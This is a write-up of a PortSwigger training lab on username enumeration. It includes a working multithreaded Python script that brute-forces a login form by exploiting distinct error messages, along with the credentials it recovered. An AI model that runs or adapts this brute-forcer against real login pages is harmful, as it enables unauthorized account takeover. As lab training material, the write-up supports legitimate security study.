# Lab: Username enumeration via different responses
## Task
This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:

[Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)  
[Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)  
To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

## Solution
A POST request in the `/login` page is as follows:  

![image](https://user-images.githubusercontent.com/44528004/130211783-ec1aee8c-e9a0-48b2-a78e-0919ddb1a57e.png)  

Here, I wrote a script to brute force username and password of the valid username based on 2 facts:  
- An incorrect username causes the program to return `Invalid username!`.
- An incorrect password of a valid username causes the program to return `Incorrect password`.
- These 2 messages are enclosed in the `<p class="is-warning"></p>` tag.  

Script:
```python
import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

URL = 'https://ac381f921e05a49a800e14bc006c00c2.web-security-academy.net/login'

with open('usernames.txt', 'r') as f:
    usernames = f.readlines()

usernames = list(map(lambda x: x.strip(), usernames))

with open('passwords.txt', 'r') as f:
    passwords = f.readlines()

passwords = list(map(lambda x: x.strip(), passwords))

true_username = None
true_password = None


def brute_username(username):
    resp = requests.post(url=URL, data={'username': username, 'password': 'test'})
    soup = BeautifulSoup(resp.text, 'html.parser')
    if soup.find(class_='is-warning').text != 'Invalid username':
        return username
    else:
        return ''


def brute_password(password):
    resp = requests.post(url=URL, data={'username': true_username, 'password': password})
    soup = BeautifulSoup(resp.text, 'html.parser')
    try:
        warning = soup.find(class_='is-warning').text
        if warning == 'Incorrect password':
            return ''
        else:
            return password
    except:
        return password


with ThreadPoolExecutor(max_workers=10) as executor:
    res = list(executor.map(brute_username, usernames))
    true_username = ''.join(res)

with ThreadPoolExecutor(max_workers=10) as executor:
    res = list(executor.map(brute_password, passwords))
    true_password = ''.join(res)

print(true_username, true_password)
```

Run script:
```
E:\PortSwigger\venv\Scripts\python.exe E:/PortSwigger/brute_forcer.py
application baseball
```

As during bruteforcing, the script also sends a valid credential to the program and thereby receiving the `Congratulations, you solved the lab!` message.  

![image](https://user-images.githubusercontent.com/44528004/130212310-7c87e9ad-0c92-4529-b0f8-10e6dcece762.png)
> Solved!
